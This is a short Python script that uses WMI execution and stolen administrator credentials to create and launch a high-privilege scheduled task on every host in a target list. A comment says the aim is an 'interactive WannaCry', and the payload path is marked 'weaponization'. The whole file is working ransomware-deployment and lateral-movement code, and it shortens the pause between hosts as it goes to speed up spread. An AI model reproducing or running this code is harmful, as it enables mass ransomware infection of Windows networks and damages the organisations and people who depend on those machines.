#/usr/env/python3

import argparse
import fileinput
import time
import wmiexec

payload = 'C:\\tg\\wc.exe' # weaponization
#payload = 'C:\\Windows\\System32\\calc.exe' # dummy

pause = 2

parser = argparse.ArgumentParser()
parser.add_argument('--username', help='username (with RPC privileges)')
parser.add_argument('--password', help='password')
parser.add_argument('--kali', action='store_true', help='specify that you\'re running on Kali')
parser.add_argument('--pause', metavar='SECONDS', type=int)
parser.add_argument('--hosts', metavar='FILE', required=True, help='file(s) with hostnames/ip-addresses to targets, if empty, stdin is used')
args = parser.parse_args()

username = args.username
password = args.password
if args.pause: pause = args.pause 
hosts = open(args.hosts,'r').read().splitlines()

taskname = 'wc'
sch_task = 'SCHTASKS /CREATE /TN "{0}" /TR "{1}" /IT /F /RL HIGHEST /SC ONCE /SD 01/01/1910 /ST 00:00 /RU {2} /RP {3}'.format(taskname, payload, username, password)
exec_task = 'SCHTASKS /RUN /TN {0}'.format(taskname)

j = len(hosts)
for i, host in enumerate(hosts):
	if i != 0:
		print('Waiting for {0:f} seconds'.format(pause))
		time.sleep(pause)
	print(host)
	if args.kali:
		print('todo')
		#TODO:
		#wmiexec
		#change color
	else:
		# To get an interactive WannaCry, we need to schedule, and then run
		wmiobj = wmiexec.WMIEXEC(sch_task, username, password, noOutput=True, share='ADMIN$')
		wmiobj.run(host)
		wmiobj = wmiexec.WMIEXEC(exec_task, username, password, noOutput=True, share='ADMIN$')
		wmiobj.run(host)
	if i > j / 6: # Accellerate
		pause = pause * 0.6

